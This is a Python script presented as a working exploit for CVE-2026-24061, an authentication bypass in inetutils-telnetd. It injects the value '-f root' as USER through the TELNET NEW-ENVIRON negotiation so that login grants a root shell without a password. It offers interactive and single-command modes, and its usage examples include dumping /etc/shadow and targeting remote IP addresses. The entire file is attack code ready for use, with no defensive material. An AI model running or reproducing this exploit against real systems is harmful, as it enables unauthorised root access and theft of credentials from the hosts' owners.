#!/usr/bin/env python3
"""
CVE-2026-24061 - inetutils-telnetd Authentication Bypass Exploit

This script replicates the behavior of: USER='-f root' telnet -a localhost

The exploit works by sending USER='-f root' via the TELNET NEW-ENVIRON option
during protocol negotiation. The vulnerable telnetd passes this to login,
which interprets '-f root' as "force login as root without authentication".
"""

import socket
import sys
import select
import argparse

# TELNET protocol constants
IAC  = bytes([255])  # Interpret As Command
DONT = bytes([254])
DO   = bytes([253])
WONT = bytes([252])
WILL = bytes([251])
SB   = bytes([250])  # Subnegotiation Begin
SE   = bytes([240])  # Subnegotiation End

# TELNET options
OPT_ECHO           = bytes([1])
OPT_SUPPRESS_GA    = bytes([3])   # Suppress Go Ahead
OPT_TTYPE          = bytes([24])  # Terminal Type
OPT_NAWS           = bytes([31])  # Window Size
OPT_TSPEED         = bytes([32])  # Terminal Speed
OPT_LINEMODE       = bytes([34])
OPT_NEW_ENVIRON    = bytes([39])  # New Environment Option
OPT_AUTHENTICATION = bytes([37])

# NEW-ENVIRON sub-options
ENV_IS      = bytes([0])
ENV_SEND    = bytes([1])
ENV_INFO    = bytes([2])
ENV_VAR     = bytes([0])
ENV_VALUE   = bytes([1])
ENV_ESC     = bytes([2])
ENV_USERVAR = bytes([3])


class TelnetExploit:
    def __init__(self, host: str, port: int = 23, user: str = "-f root", 
                 timeout: int = 10, command: str = None):
        self.host = host
        self.port = port
        self.user = user
        self.timeout = timeout
        self.command = command
        self.sock = None
        self.buffer = b""
        
    def connect(self):
        """Establish TCP connection to telnet server."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        print(f"[*] Connected to {self.host}:{self.port}")
        
    def send(self, data: bytes):
        """Send raw data to server."""
        self.sock.sendall(data)
        
    def recv(self, size: int = 4096) -> bytes:
        """Receive data from server."""
        return self.sock.recv(size)
    
    def negotiate_option(self, command: bytes, option: bytes):
        """Respond to TELNET option negotiation."""
        if command == DO:
            if option == OPT_NEW_ENVIRON:
                # We WILL do NEW-ENVIRON (this is how we send USER)
                self.send(IAC + WILL + option)
                print(f"[*] Agreed to NEW-ENVIRON (sending USER='{self.user}')")
            elif option == OPT_TTYPE:
                # We WILL send terminal type
                self.send(IAC + WILL + option)
            elif option == OPT_NAWS:
                # We WILL send window size
                self.send(IAC + WILL + option)
                # Send window size subnegotiation (80x24)
                self.send(IAC + SB + OPT_NAWS + bytes([0, 80, 0, 24]) + IAC + SE)
            elif option == OPT_TSPEED:
                # We WILL send terminal speed
                self.send(IAC + WILL + option)
            elif option == OPT_LINEMODE:
                self.send(IAC + WONT + option)
            elif option == OPT_AUTHENTICATION:
                # We WON'T do authentication
                self.send(IAC + WONT + option)
            else:
                # Default: won't do unknown options
                self.send(IAC + WONT + option)
                
        elif command == WILL:
            if option == OPT_ECHO:
                # Server will echo - we accept
                self.send(IAC + DO + option)
            elif option == OPT_SUPPRESS_GA:
                # Server will suppress go-ahead - we accept
                self.send(IAC + DO + option)
            else:
                # Default: don't want server to do unknown options
                self.send(IAC + DONT + option)
                
        elif command == WONT:
            self.send(IAC + DONT + option)
            
        elif command == DONT:
            self.send(IAC + WONT + option)
            
    def handle_subnegotiation(self, data: bytes):
        """Handle TELNET subnegotiation."""
        if len(data) < 1:
            return
            
        option = bytes([data[0]])
        subdata = data[1:]
        
        if option == OPT_TTYPE:
            # Server wants terminal type - send xterm
            ttype = b"XTERM-256COLOR"
            self.send(IAC + SB + OPT_TTYPE + bytes([0]) + ttype + IAC + SE)
            
        elif option == OPT_TSPEED:
            # Server wants terminal speed
            speed = b"38400,38400"
            self.send(IAC + SB + OPT_TSPEED + bytes([0]) + speed + IAC + SE)
            
        elif option == OPT_NEW_ENVIRON:
            # Server wants environment variables - THIS IS THE EXPLOIT
            if subdata and subdata[0] == ENV_SEND[0]:
                # Server is requesting we send environment variables
                # Send USER with our malicious value
                response = (IAC + SB + OPT_NEW_ENVIRON + ENV_IS +
                           ENV_VAR + b"USER" + ENV_VALUE + self.user.encode() +
                           IAC + SE)
                self.send(response)
                print(f"[+] Sent USER='{self.user}' via NEW-ENVIRON")
                
    def process_data(self, data: bytes) -> bytes:
        """Process received data, handle TELNET commands, return printable output."""
        output = b""
        i = 0
        
        while i < len(data):
            if data[i:i+1] == IAC:
                if i + 1 >= len(data):
                    break
                    
                cmd = data[i+1:i+2]
                
                if cmd == IAC:
                    # Escaped IAC
                    output += IAC
                    i += 2
                    
                elif cmd in (DO, DONT, WILL, WONT):
                    if i + 2 >= len(data):
                        break
                    option = data[i+2:i+3]
                    self.negotiate_option(cmd, option)
                    i += 3
                    
                elif cmd == SB:
                    # Find end of subnegotiation
                    end = data.find(IAC + SE, i)
                    if end == -1:
                        break
                    subdata = data[i+2:end]
                    self.handle_subnegotiation(subdata)
                    i = end + 2
                    
                else:
                    # Other command, skip
                    i += 2
            else:
                output += data[i:i+1]
                i += 1
                
        return output
    
    def execute_command(self, command: str) -> str:
        """Execute a single command and return the output."""
        import time
        
        # Send the command
        self.sock.sendall((command + "\r\n").encode())
        time.sleep(0.5)
        
        # Collect output
        output = b""
        self.sock.settimeout(2)
        try:
            while True:
                data = self.recv(4096)
                if not data:
                    break
                output += self.process_data(data)
        except socket.timeout:
            pass
            
        return output.decode(errors="ignore")
    
    def interactive(self):
        """Enter interactive mode - pass stdin to server, server output to stdout."""
        # Check if we have a real TTY
        if not sys.stdin.isatty():
            print("[!] No TTY detected, use -c to run a command instead")
            return
            
        import tty
        import termios
        
        print("[*] Entering interactive mode (Ctrl+] to escape)")
        print("-" * 60)
        
        old_settings = termios.tcgetattr(sys.stdin)
        try:
            tty.setraw(sys.stdin.fileno())
            self.sock.setblocking(False)
            
            while True:
                readable, _, _ = select.select([self.sock, sys.stdin], [], [], 0.1)
                
                for fd in readable:
                    if fd == self.sock:
                        try:
                            data = self.sock.recv(4096)
                            if not data:
                                print("\n[*] Connection closed by server")
                                return
                            output = self.process_data(data)
                            sys.stdout.buffer.write(output)
                            sys.stdout.buffer.flush()
                        except BlockingIOError:
                            pass
                        except ConnectionResetError:
                            print("\n[*] Connection reset by server")
                            return
                            
                    elif fd == sys.stdin:
                        char = sys.stdin.read(1)
                        if char == '\x1d':  # Ctrl+]
                            print("\n[*] Escape pressed, closing connection")
                            return
                        self.sock.sendall(char.encode())
                        
        except KeyboardInterrupt:
            print("\n[*] Interrupted")
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
            
    def run(self):
        """Main exploit execution."""
        try:
            self.connect()
            
            # Initial negotiation phase
            print("[*] Negotiating TELNET options...")
            self.sock.settimeout(2)
            
            # Read and process initial server data/negotiations
            try:
                while True:
                    data = self.recv(4096)
                    if not data:
                        break
                    output = self.process_data(data)
                    if output:
                        sys.stdout.buffer.write(output)
                        sys.stdout.buffer.flush()
            except socket.timeout:
                pass
            
            # If command mode, run the command and exit
            if self.command:
                print(f"\n[*] Executing command: {self.command}")
                result = self.execute_command(self.command)
                print(result)
                return
            
            # Reset timeout and go interactive
            self.sock.settimeout(None)
            self.interactive()
            
        except ConnectionRefusedError:
            print(f"[-] Connection refused to {self.host}:{self.port}")
            sys.exit(1)
        except socket.timeout:
            print(f"[-] Connection timed out to {self.host}:{self.port}")
            sys.exit(1)
        finally:
            if self.sock:
                self.sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-24061 inetutils-telnetd auth bypass exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s localhost              # Exploit localhost as root (interactive)
  %(prog)s -c id localhost        # Run 'id' command and exit
  %(prog)s -c "cat /etc/shadow" localhost  # Extract shadow file
  %(prog)s 192.168.1.100          # Exploit remote host as root
  %(prog)s -u "-f admin" target   # Login as different user
  %(prog)s -p 2323 target         # Use non-standard port
        """
    )
    parser.add_argument("host", help="Target hostname or IP")
    parser.add_argument("-p", "--port", type=int, default=23, help="Target port (default: 23)")
    parser.add_argument("-u", "--user", default="-f root", 
                        help="USER value to send (default: '-f root')")
    parser.add_argument("-c", "--command", 
                        help="Command to execute (non-interactive mode)")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                        help="Connection timeout in seconds (default: 10)")
    
    args = parser.parse_args()
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-24061 - inetutils-telnetd Authentication Bypass    ║
║  Affects: inetutils-telnetd 1.9.3 - 2.7                      ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    exploit = TelnetExploit(
        host=args.host,
        port=args.port,
        user=args.user,
        timeout=args.timeout,
        command=args.command
    )
    exploit.run()


if __name__ == "__main__":
    main()

